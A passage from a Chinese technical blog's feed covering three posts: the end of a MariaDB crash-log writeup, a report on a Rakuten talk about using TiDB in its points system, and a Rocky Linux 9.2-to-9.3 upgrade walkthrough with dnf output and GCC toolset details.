class="line">Query (0x55c6dce26ba0): CALL p1()</span><br><span class="line">Connection ID (thread ID): 8</span><br><span class="line">Status: NOT_KILLED</span><br><span class="line"></span><br><span class="line">Optimizer switch: index_merge=on,index_merge_union=on,index_merge_sort_union=on,index_merge_intersection=on,index_merge_sort_intersection=off,engine_condition_pushdown=off,index_condition_pushdown=on,derived_merge=on,derived_with_keys=on,firstmatch=on,loosescan=on,materialization=on,in_to_exists=on,semijoin=on,partial_match_rowid_merge=on,partial_match_table_scan=on,subquery_cache=on,mrr=off,mrr_cost_based=off,mrr_sort_keys=off,outer_join_with_cache=on,semijoin_with_cache=on,join_cache_incremental=on,join_cache_hashed=on,join_cache_bka=on,optimize_join_buffer_size=on,table_elimination=on,extended_keys=on,exists_to_in=on,orderby_uses_equalities=on,condition_pushdown_for_derived=on,split_materialized=on,condition_pushdown_for_subquery=on,rowid_filter=on,condition_pushdown_from_having=on</span><br><span class="line"></span><br><span class="line">The manual page at http://dev.mysql.com/doc/mysql/en/crashing.html contains</span><br><span class="line">information that should help you find out what is causing the crash.</span><br><span class="line">Writing a core file...</span><br><span class="line">Working directory at /var/lib/mysql</span><br><span class="line">Resource Limits:</span><br><span class="line">Limit                     Soft Limit           Hard Limit           Units</span><br><span class="line">Max cpu time              unlimited            unlimited            seconds</span><br><span class="line">Max file size             unlimited            unlimited            bytes</span><br><span class="line">Max data size             unlimited            unlimited            bytes</span><br><span class="line">Max stack size            8388608              unlimited            bytes</span><br><span class="line">Max core file size        unlimited            unlimited            bytes</span><br><span class="line">Max resident set          unlimited            unlimited            bytes</span><br><span class="line">Max processes             unlimited            unlimited            processes</span><br><span class="line">Max open files            10485760             10485760             files</span><br><span class="line">Max locked memory         65536                65536                bytes</span><br><span class="line">Max address space         unlimited            unlimited            bytes</span><br><span class="line">Max file locks            unlimited            unlimited            locks</span><br><span class="line">Max pending signals       14938                14938                signals</span><br><span class="line">Max msgqueue size         819200               819200               bytes</span><br><span class="line">Max nice priority         0                    0</span><br><span class="line">Max realtime priority     0                    0</span><br><span class="line">Max realtime timeout      unlimited            unlimited            us</span><br><span class="line">Core pattern: |abrt-hook-ccpp %s %c %p %u %g %t %e %P %I %h</span><br></pre></td></tr></table></figure></div>
<p>!!! 不要在生产环境“服用”该案例。</p>
<img  alt="hanxiaobanbudian.gif" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231121-fc472f49-9c06-4a1b-90c8-1c2b7ef71b18.gif"
                      referrerpolicy="no-referrer"
                >
<h2 id="总结">总结</h2>
<p>只讨论技术就好，盯着股价意义不大，何况重心就不在那。技术无国界，但是产品有属国。水土不服也不是不可预估。</p>
<p>SQL 规范要搞好，存储过程该禁用的还是禁用了吧。</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >]]></content>
      <categories>
        <category>MariaDB</category>
      </categories>
      <tags>
        <tag>mariadb</tag>
        <tag>mariadb 10.6</tag>
        <tag>mariadb bug</tag>
      </tags>
  </entry>
  <entry>
    <title>记 Rakuten 技术分享会</title>
    <url>/2023/tidb/tidb-talk-record-rakuten/</url>
    <content><![CDATA[<p>11月18日，2023 Rakuten 技术大会在东京、上海和大连三地线下联动召开，期间有一场 TiDB 的 Talk，《刘洋：TiDB 在乐天积分系统的最佳实践》。</p>
<p>活动地点很近，就在我司对面，所以中午专门抽时间去聆听了刘洋老师的分享，只是会后又匆忙溜回公司搬砖，没来得及好好交流。</p>
<h2 id="关于乐天-Rakuten">关于乐天 Rakuten</h2>
<p>可能好多同学对这家公司很陌生，因为这是一家三资企业。也有些同学似曾听过，只不过这不是韩国的乐天集团（Lotte）。</p>
<ul>
<li>日本楽天集团 Rakuten Group</li>
</ul>
<p>创立于1997年2月，总部位于东京，是日本最大的电商平台之一，也是日本家喻户晓的互联网综合服务平台。Rakuten Group 旗下有70多个业务领域、涵盖网络购物商城、信用卡、电子支付、银行、证券、保险、旅游、专业体育、拍卖、通讯、媒体等，利用楽天会员制度为枢纽将这些服务相互串起，创造出独有的「楽天生态圈」，目前楽天的服务业务已在全球拥有超17亿的注册用户。</p>
<ul>
<li>楽天中国 Rakuten CNTD</li>
</ul>
<p>乐天创研（北京）科技有限公司成立于2010年10月，是 Rakuten Group 在华投资建立的全资子公司。2015年3月在上海成立了第一家分公司，2019年3月在大连成立了第二家分公司。楽天人在中国搭建起的业务服务平台与全球业务纵向互通，覆盖全球范围内的电子商务、营销、旅游、通信、证券、数据科学等服务，并充分利用Rakuten Group在互联网领域所积累的经验和最前沿技术，发挥中国优秀人才的聪明才智，为全球客户提供更加完善、优质的服务。</p>
<h2 id="TiDB-Talk-内容">TiDB Talk 内容</h2>
<p>刘洋老师在 2023 Rakuten 技术大会上分享的 TiDB 在乐天积分系统中的最佳实践。</p>
<p>目前使用 60+节点，单表90亿+，介绍了乐天积分系统的早期碰到的数据量不断增加厚的挑战，以及背后的数据架构。</p>
<p>在选型初期对比了 YugabyteDB 和 CockroachDB 的弹性扩缩容方面的性能对比。</p>
<p>部分 PPT 实拍请参见帖子： <a class="link"   href="https://asktug.com/t/topic/1017425" >https://asktug.com/t/topic/1017425 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>说回技术话题。或许有同学会有疑问，单表90亿+ 的数据量，之前是什么数据库，单机怎么支撑的了。</p>
<p>答案很简单，之前用的不是开源数据库，而是 Oracle RAC 集群，而且是主备两套 Oracle RAC，嗯哼，一切都说的通了。</p>
<p>或许是上云趋势不可逆，或许是这家企业对开源社区有浓厚的兴趣，整体技术架构都在进行一场大变革。</p>
<p>基础设施方面，由混和云构建，自建了 Rakuten One Cloud，引入了 Azure 云，这里没用 AWS？蛮有趣。</p>
<p>数据库方面，转向 NewSQL，引入 Cassandra / MySQL / TiDB / etcd 。</p>
<p>应用层方面，将传统的单体服务进行拆分，基于微服务改造，应用服务运行在 k8s 上。</p>
<h2 id="乐天积分系统，用-TiDB">乐天积分系统，用 TiDB</h2>
<p>经过审慎严谨的选型对比，在最终确认新架构的方案中，选择了用 TiDB。</p>
<p>选择的理由主要是：</p>
<ol>
<li>MySQL 兼容性；支持二级索引</li>
<li>高扩展性，支持将数据处理节点和存储节点水平扩展</li>
<li>友好的管理接口、工具；跨区域部署</li>
<li>强大的开源社区；本地商业支持</li>
</ol>
<img  alt="db-rank.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/db-rank-1700452587580.png"
                      referrerpolicy="no-referrer"
                >
<p>在 TiDB 拓扑设计上，设计了主、备双中心，实现异地容灾，双中心通过 TiCDC 进行数据同步。</p>
<p>存储节点使用了 TiKV 行存引擎和 TiFlash 列存引擎，两款存储引擎。在 Talk 中，刘老师有介绍到，他们的点查响应在 20+ ms。</p>
<h2 id="后期迭代升级">后期迭代升级</h2>
<p>在 Talk 中，刘老师介绍了该系统对 TiDB 日后的创新使用，或将引入两项强大特性，冷热分离和资源管控。</p>
<p>从 TiDB 6.0 开始，Placement Rules in SQL 特性 GA，通过该功能，DBA 可以将表和分区指定部署至不同的地域、机房、机柜、主机。借助该特性，可将热数据和冷数据分别存储到 SSD 和 HDD，以降低存储成本。</p>
<p>关于该特性的详细介绍，请参阅官方文档: <a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/placement-rules-in-sql#placement-rules-in-sql" >Placement Rules in SQL <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>以及，专栏文章： <a class="link"   href="https://tidb.net/blog/387bd516" >TiDB 冷热存储分离解决方案 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>从 TiDB 7.1.0 LTS 开始，资源管控特性 GA，通过该特性，DBA 可以自定义资源组，通过资源组限定硬件资源配额，并将用户绑定到某个资源组，以实现应用的资源隔离，满足服务质量 (QoS) 要求。</p>
<p>关于该特性的详细介绍，请参阅官方文档: <a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/tidb-resource-control" >使用资源管控 (Resource Control) 实现资源隔离 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>以及，专栏文章： <a class="link"   href="https://tidb.net/blog/978ee7ab" >TiDB 7.1.0 LTS 特性解读 | 资源管控 (Resource Control) 应该知道的 6 件事 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>最后，关于 TiDB 版本选择，刘老师介绍本番环境将会用到最新的 7.1.x。</p>
<p>Ps. TiDB 7.5.0 LTS 不日将会发版，欢迎迫不及待的同学先参阅专栏文章： <a class="link"   href="https://tidb.net/blog/8f6af887" >TiDB 7.x 源码编译之 TiDB Server 篇，及新特性详解 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="总结">总结</h2>
<p>感谢刘老师带来的线下 TiDB Talk，活动很棒，现场参会人数很多，去晚的我只能坐在角落，hhh~</p>
<p>TiDB 社区线下地区活动，上海站已经举办了若干场，大连这边陲小镇有机会还要加油搞起来，啊~</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >
]]></content>
      <categories>
        <category>TiDB</category>
      </categories>
      <tags>
        <tag>tidb</tag>
        <tag>tidb 7.x</tag>
      </tags>
  </entry>
  <entry>
    <title>【Rocky 9】Rocky Linux 9.2 升级 9.3，及新特性实践</title>
    <url>/2023/linux/rocky-9.3-upgrade-from-9.2/</url>
    <content><![CDATA[<img  alt="rocky-linux.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231121-0b401079-e902-4483-b6b5-49c37d784bb0.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="发版计划">发版计划</h2>
<p>前面介绍了如何安装和升级 Rocky Linux 9.2 操作系统，按照 RHEL 的发版计划，RHEL 9.3 已于 11 月 7 日发版，而 Rocky Linux 作为 RHEL 的下游，也于近日发布更新。</p>
<ul>
<li><a href="https://shawnyan.cn/2023/linux/centos-7.9-upgrade-to-rocky-9.2/">【Rocky 9】Step by Step 从 CentOS 7.9 升级到 Rocky Linux 9.2</a></li>
<li><a href="https://shawnyan.cn/2023/linux/rocky-9.2-install/">【Rocky 9】Step by Step 安装 Rocky Linux 9.2 系统</a></li>
</ul>
<!--
- [【Rocky 9】Step by Step 从 CentOS 7.9 升级到 Rocky Linux 9.2](https://www.modb.pro/db/1717086120041865216)
- [【Rocky 9】Step by Step 安装 Rocky Linux 9.2 系统](https://www.modb.pro/db/1716634949384757248)
-->
<p>先来回顾一下 Red Hat Enterprise Linux Version 9 的生命周期。<br>
依据官网说明，RHEL 9 每六个月发版一次，9.3 于 23 年 11 月发版，9.4 将在 24 年 2 月发布。<br>
已发布的版本信息如下：</p>
<table>
<thead>
<tr>
<th><strong>发布版本</strong></th>
<th><strong>GA 日期</strong></th>
<th><strong>内核版本</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>RHEL 9.3</td>
<td>2023-11-07</td>
<td>5.14.0-362.8.1.el9_3</td>
</tr>
<tr>
<td>RHEL 9.2</td>
<td>2023-05-10</td>
<td>5.14.0-284.11.1.el9_2</td>
</tr>
<tr>
<td>RHEL 9.1</td>
<td>2022-11-15</td>
<td>5.14.0-162.6.1.el9_1</td>
</tr>
<tr>
<td>RHEL 9.0</td>
<td>2022-05-17</td>
<td>5.14.0-70.13.1.el9_0</td>
</tr>
</tbody>
</table>
<!--
RHEL 9 发版计划
https://access.redhat.com/support/policy/updates/errata#Full_Support_Phase
https://access.redhat.com/articles/3078#RHEL9
https://access.redhat.com/errata/RHBA-2023:6580
https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/9/html/9.3_release_notes/index
-->
<img  alt="rhel9lifecycle.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231121-080b8479-a6d4-4e14-a53c-e98d3defbc54.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="升级到-Rocky-9-3">升级到 Rocky 9.3</h2>
<p>这里使用 <code>dnf</code> 在线升级，如果是内网用户，建议先查验 yum 源是否已更新。如果没有中央 yum 源，可以下载最新的 Rocky Linux 9.3 镜像，手动挂载，并配置本地 yum 源，然后再进行升级。</p>
<ol>
<li>检查当前的 Release 版本和 Kernel 版本。</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/redhat-release</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure></div>
<p>输出：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ cat /etc/redhat-release</span><br><span class="line">Rocky Linux release 9.2 (Blue Onyx)</span><br><span class="line">[shawnyan@rocky9 ~]$ uname -a</span><br><span class="line">Linux rocky9.shawnyan.cn 5.14.0-284.30.1.el9_2.x86_64 #1 SMP PREEMPT_DYNAMIC Sat Sep 16 09:55:41 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line">[shawnyan@rocky9 ~]$</span><br></pre></td></tr></table></figure></div>
<ol start="2">
<li>在线升级。</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dnf -y upgrade</span><br></pre></td></tr></table></figure></div>
<p>输出日志：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ sudo dnf -y upgrade --allowerasing</span><br><span class="line">Last metadata expiration check: 0:00:19 ago on Tue 21 Nov 2023 01:33:19 PM UTC.</span><br><span class="line">Dependencies resolved.                                              </span><br><span class="line">==============================================================================================================================================</span><br><span class="line"> Package                                       Architecture          Version                     Repository                              Size</span><br><span class="line">==============================================================================================================================================</span><br><span class="line">Installing:                                                                                                   </span><br><span class="line"> kernel                                        x86_64                5.14.0-362.8.1.el9_3        baseos                                 5.1 M</span><br><span class="line">Upgrading:                                                                                                    </span><br><span class="line"> NetworkManager                                x86_64                1:1.44.0-3.el9              baseos                                 2.2 M</span><br><span class="line"> NetworkManager-adsl                           x86_64                1:1.44.0-3.el9              baseos                                  36 k</span><br><span class="line">...                                                                                                           </span><br><span class="line"> gcc                                           x86_64                11.4.1-2.1.el9              appstream                               32 M</span><br><span class="line"> gcc-c++                                       x86_64                11.4.1-2.1.el9              appstream                               13 M</span><br><span class="line"> gcc-plugin-annobin                            x86_64                11.4.1-2.1.el9              appstream                               48 k</span><br><span class="line"> gcc-toolset-12-binutils                       x86_64                2.38-19.el9                 appstream                              5.4 M</span><br><span class="line"> gcc-toolset-12-binutils-gold                  x86_64                2.38-19.el9                 appstream                              771 k</span><br><span class="line"> gdb                                           x86_64                10.2-11.el9                 appstream                              121 k</span><br><span class="line"> gdb-headless                                  x86_64                10.2-11.el9                 appstream                              3.9 M</span><br><span class="line">...                                                                                                           </span><br><span class="line"> iproute                                       x86_64                6.2.0-5.el9                 baseos                                 786 k</span><br><span class="line"> iproute-tc                                    x86_64                6.2.0-5.el9                 baseos                                 448 k</span><br><span class="line">...                                                                                                           </span><br><span class="line"> kernel-headers                                x86_64                5.14.0-362.8.1.el9_3        appstream                              6.5 M</span><br><span class="line"> kernel-srpm-macros                            noarch                1.0-13.el9                  appstream                               15 k</span><br><span class="line"> kernel-tools                                  x86_64                5.14.0-362.8.1.el9_3        baseos                                 5.3 M</span><br><span class="line"> kernel-tools-libs                             x86_64                5.14.0-362.8.1.el9_3        baseos                                 5.1 M</span><br><span class="line">...                                                                                                           </span><br><span class="line"> rocky-backgrounds                             noarch                90.14-2.el9                 appstream                               61 M</span><br><span class="line"> rocky-gpg-keys                                noarch                9.3-1.1.el9                 baseos                                  13 k</span><br><span class="line"> rocky-logos                                   x86_64                90.14-2.el9                 appstream                              715 k</span><br><span class="line"> rocky-release                                 noarch                9.3-1.1.el9                 baseos                                  23 k</span><br><span class="line"> rocky-repos                                   noarch                9.3-1.1.el9                 baseos                                  13 k</span><br><span class="line">...                                                                                                           </span><br><span class="line">Installing dependencies:                                                                                      </span><br><span class="line"> debugedit                                     x86_64                5.0-4.el9                   appstream                               76 k</span><br><span class="line"> kbd-legacy                                    noarch                2.4.0-9.el9                 baseos                                 502 k</span><br><span class="line"> kernel-core                                   x86_64                5.14.0-362.8.1.el9_3        baseos                                  20 M</span><br><span class="line"> kernel-modules                                x86_64                5.14.0-362.8.1.el9_3        baseos                                  37 M</span><br><span class="line"> kernel-modules-core                           x86_64                5.14.0-362.8.1.el9_3        baseos                                  32 M</span><br><span class="line"> libtraceevent                                 x86_64                1.5.3-3.el9                 baseos                                 213 k</span><br><span class="line"> liburing                                      x86_64                2.3-2.el9                   appstream                               26 k</span><br><span class="line"> libxcvt                                       x86_64                0.1.2-2.el9                 appstream                               13 k</span><br><span class="line">Installing weak dependencies:                                                                                 </span><br><span class="line"> kernel-devel                                  x86_64                5.14.0-362.8.1.el9_3        appstream                               20 M</span><br><span class="line">Removing dependent packages:                                                                                  </span><br><span class="line"> libstdc++-static                              x86_64                11.3.1-4.3.el9              @devel                                 6.5 M</span><br><span class="line"> libtirpc-devel                                x86_64                1.3.3-1.el9                 @devel                                 251 k</span><br><span class="line">                                                                                                              </span><br><span class="line">Transaction Summary                                                                                           </span><br><span class="line">==============================================================================================================================================</span><br><span class="line">Install   10 Packages                                                                                         </span><br><span class="line">Upgrade  459 Packages                                                                                         </span><br><span class="line">Remove     2 Packages                                                                                         </span><br><span class="line">                                                                                                              </span><br><span class="line">Total download size: 1.1 G                                                                                    </span><br><span class="line">...                                                                                                           </span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">Total                                                                                                         2.5 MB/s | 1.1 GB     07:11</span><br><span class="line">Running transaction check                                           </span><br><span class="line">Transaction check succeeded.                                           </span><br><span class="line">Running transaction test                                               </span><br><span class="line">Transaction test succeeded.                                            </span><br><span class="line">Running transaction                                                    </span><br><span class="line">  Running scriptlet: selinux-policy-targeted-38.1.23-1.el9.noarch                                                                         1/1</span><br><span class="line">  Running scriptlet: kmod-kvdo-8.2.1.6-98.el9.x86_64                                                                                      1/1</span><br><span class="line">  Preparing        :                                                                                                                      1/1</span><br><span class="line">  Upgrading        : libgcc-11.4.1-2.1.el9.x86_64                                                                                       1/930</span><br><span class="line">  Running scriptlet: libgcc-11.4.1-2.1.el9.x86_64                                                                                       1/930</span><br><span class="line">...                                                                    </span><br></pre></td></tr></table></figure></div>
<img  alt="20231121_140107.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231121-7f4c6bba-c4ae-4fea-8a1f-63dd485637cf.png"
                      referrerpolicy="no-referrer"
                >
<p>受系统资源和网速的影响，整个升级过程约半小时。</p>
<ol start="3">
<li>升级后查验。</li>
</ol>
<p>升级完成后，再次查看版本信息。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/redhat-release</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure></div>
<p>输出：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ cat /etc/redhat-release</span><br><span class="line">Rocky Linux release 9.3 (Blue Onyx)</span><br><span class="line">[shawnyan@rocky9 ~]$ uname -a</span><br><span class="line">Linux rocky9.shawnyan.cn 5.14.0-362.8.1.el9_3.x86_64 #1 SMP PREEMPT_DYNAMIC Wed Nov 8 17:36:32 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line">[shawnyan@rocky9 ~]$</span><br></pre></td></tr></table></figure></div>
<h2 id="主要更新">主要更新</h2>
<h3 id="Kernel-内核版本">Kernel 内核版本</h3>
<p>上文的表格中已经标记了 RHEL 的内核版本，Rocky Linux 与 RHEL 保持一致，在 Rocky 9.2 中是 <code>5.14.0-284.11.1.el9_2</code>。</p>
<p>我本地环境升级过，所以小版本号略高一点：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ uname -r</span><br><span class="line">5.14.0-284.30.1.el9_2.x86_64</span><br></pre></td></tr></table></figure></div>
<p>而在 Rocky 9.3 中，默认的内核版本升级为 <code>5.14.0-362.8.1.el9_3</code>。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ uname -r</span><br><span class="line">5.14.0-362.8.1.el9_3.x86_64</span><br></pre></td></tr></table></figure></div>
<h3 id="编译工具-GCC">编译工具 GCC</h3>
<p>GCC (GNU Compiler Collection) 提供了使用C、c++ 和 Fortran 编程语言开发应用程序的工具。</p>
<p>在 Rocky 9.2 中，GCC 工具的版本默认为 11.3.1。同时，可以通过安装 <code>gcc-toolset</code> 将其版本升级到 12。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ gcc --version</span><br><span class="line">gcc (GCC) 11.3.1 20221121 (Red Hat 11.3.1-4)</span><br><span class="line">Copyright (C) 2021 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.  There is NO</span><br><span class="line">warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="line">[shawnyan@rocky9 ~]$</span><br><span class="line">[shawnyan@rocky9 ~]$ rpm -qa | grep gcc-toolset</span><br><span class="line">gcc-toolset-12-runtime-12.0-6.el9.x86_64</span><br><span class="line">gcc-toolset-12-annobin-docs-11.08-2.el9.noarch</span><br><span class="line">gcc-toolset-12-libstdc++-devel-12.2.1-7.4.el9.x86_64</span><br><span class="line">gcc-toolset-12-binutils-gold-2.38-17.el9_2.1.x86_64</span><br><span class="line">gcc-toolset-12-binutils-2.38-17.el9_2.1.x86_64</span><br><span class="line">gcc-toolset-12-gcc-12.2.1-7.4.el9.x86_64</span><br><span class="line">gcc-toolset-12-gcc-c++-12.2.1-7.4.el9.x86_64</span><br><span class="line">gcc-toolset-12-annobin-plugin-gcc-11.08-2.el9.x86_64</span><br><span class="line">gcc-toolset-12-annobin-annocheck-11.08-2.el9.x86_64</span><br><span class="line">[shawnyan@rocky9 ~]$</span><br><span class="line">[shawnyan@rocky9 ~]$ scl enable gcc-toolset-12 bash</span><br><span class="line">[shawnyan@rocky9 ~]$ gcc --version</span><br><span class="line">gcc (GCC) 12.2.1 20221121 (Red Hat 12.2.1-7)</span><br><span class="line">Copyright (C) 2022 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.  There is NO</span><br><span class="line">warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br></pre></td></tr></table></figure></div>
<p>在 Rocky 9.3 中，GCC 版本升级到了 11.4.1。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ gcc --version</span><br><span class="line">gcc (GCC) 11.4.1 20230605 (Red Hat 11.4.1-2)</span><br><span class="line">Copyright (C) 2021 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.  There is NO</span><br><span class="line">warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="line"></span><br><span class="line">[shawnyan@rocky9 ~]$ rpm -qa | grep gcc-toolset</span><br></pre></td></tr></table></figure></div>
<p>同时，可以通过安装 <code>gcc-toolset</code> 将其版本升级到 13。</p>
<ul>
<li>安装 GCC Toolset 13</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ sudo dnf install gcc-toolset-13</span><br><span class="line">Last metadata expiration check: 0:02:04 ago on Tue 21 Nov 2023 02:06:55 PM UTC.</span><br><span class="line">Dependencies resolved.</span><br><span class="line">=========================================================================================================================</span><br><span class="line"> Package                                       Architecture       Version                    Repository             Size</span><br><span class="line">=========================================================================================================================</span><br><span class="line">Installing:</span><br><span class="line"> gcc-toolset-13                                x86_64             13.0-2.el9                 appstream             9.9 k</span><br><span class="line">Installing dependencies:</span><br><span class="line"> gcc-toolset-13-annobin-docs                   noarch             12.20-1.el9                appstream              95 k</span><br><span class="line"> gcc-toolset-13-annobin-plugin-gcc             x86_64             12.20-1.el9                appstream             960 k</span><br><span class="line"> gcc-toolset-13-binutils                       x86_64             2.40-13.el9                appstream             5.6 M</span><br><span class="line"> gcc-toolset-13-binutils-gold                  x86_64             2.40-13.el9                appstream             803 k</span><br><span class="line"> gcc-toolset-13-dwz                            x86_64             0.14-0.el9                 appstream             126 k</span><br><span class="line"> gcc-toolset-13-gcc                            x86_64             13.1.1-4.2.el9             appstream              43 M</span><br><span class="line"> gcc-toolset-13-gcc-c++                        x86_64             13.1.1-4.2.el9             appstream              13 M</span><br><span class="line"> gcc-toolset-13-gcc-gfortran                   x86_64             13.1.1-4.2.el9             appstream              14 M</span><br><span class="line"> gcc-toolset-13-gdb                            x86_64             12.1-3.el9                 appstream             4.3 M</span><br><span class="line"> gcc-toolset-13-libquadmath-devel              x86_64             13.1.1-4.2.el9             appstream             185 k</span><br><span class="line"> gcc-toolset-13-libstdc++-devel                x86_64             13.1.1-4.2.el9             appstream             3.3 M</span><br><span class="line"> gcc-toolset-13-runtime                        x86_64             13.0-2.el9                 appstream              27 k</span><br><span class="line"> libgfortran                                   x86_64             11.4.1-2.1.el9             baseos                807 k</span><br><span class="line"> libquadmath                                   x86_64             11.4.1-2.1.el9             baseos                197 k</span><br><span class="line"></span><br><span class="line">Transaction Summary</span><br><span class="line">=========================================================================================================================</span><br><span class="line">Install  15 Packages</span><br><span class="line"></span><br><span class="line">Total download size: 87 M</span><br><span class="line">Installed size: 255 M</span><br><span class="line">...</span><br><span class="line">Installed:</span><br><span class="line">  gcc-toolset-13-13.0-2.el9.x86_64                             gcc-toolset-13-annobin-docs-12.20-1.el9.noarch</span><br><span class="line">  gcc-toolset-13-annobin-plugin-gcc-12.20-1.el9.x86_64         gcc-toolset-13-binutils-2.40-13.el9.x86_64</span><br><span class="line">  gcc-toolset-13-binutils-gold-2.40-13.el9.x86_64              gcc-toolset-13-dwz-0.14-0.el9.x86_64</span><br><span class="line">  gcc-toolset-13-gcc-13.1.1-4.2.el9.x86_64                     gcc-toolset-13-gcc-c++-13.1.1-4.2.el9.x86_64</span><br><span class="line">  gcc-toolset-13-gcc-gfortran-13.1.1-4.2.el9.x86_64            gcc-toolset-13-gdb-12.1-3.el9.x86_64</span><br><span class="line">  gcc-toolset-13-libquadmath-devel-13.1.1-4.2.el9.x86_64       gcc-toolset-13-libstdc++-devel-13.1.1-4.2.el9.x86_64</span><br><span class="line">  gcc-toolset-13-runtime-13.0-2.el9.x86_64                     libgfortran-11.4.1-2.1.el9.x86_64</span><br><span class="line">  libquadmath-11.4.1-2.1.el9.x86_64</span><br><span class="line"></span><br><span class="line">Complete!</span><br><span class="line">Installed:</span><br><span class="line">  gcc-toolset-13-13.0-2.el9.x86_64                             gcc-toolset-13-annobin-docs-12.20-1.el9.noarch</span><br><span class="line">  gcc-toolset-13-annobin-plugin-gcc-12.20-1.el9.x86_64         gcc-toolset-13-binutils-2.40-13.el9.x86_64</span><br><span class="line">  gcc-toolset-13-binutils-gold-2.40-13.el9.x86_64              gcc-toolset-13-dwz-0.14-0.el9.x86_64</span><br><span class="line">  gcc-toolset-13-gcc-13.1.1-4.2.el9.x86_64                     gcc-toolset-13-gcc-c++-13.1.1-4.2.el9.x86_64</span><br><span class="line">  gcc-toolset-13-gcc-gfortran-13.1.1-4.2.el9.x86_64            gcc-toolset-13-gdb-12.1-3.el9.x86_64</span><br><span class="line">  gcc-toolset-13-libquadmath-devel-13.1.1-4.2.el9.x86_64       gcc-toolset-13-libstdc++-devel-13.1.1-4.2.el9.x86_64</span><br><span class="line">  gcc-toolset-13-runtime-13.0-2.el9.x86_64                     libgfortran-11.4.1-2.1.el9.x86_64</span><br><span class="line">  libquadmath-11.4.1-2.1.el9.x86_64</span><br><span class="line"></span><br><span class="line">Complete!</span><br></pre></td></tr></table></figure></div>
<ul>
<li>查看 GCC Toolset 13 安装包</li>
</ul>
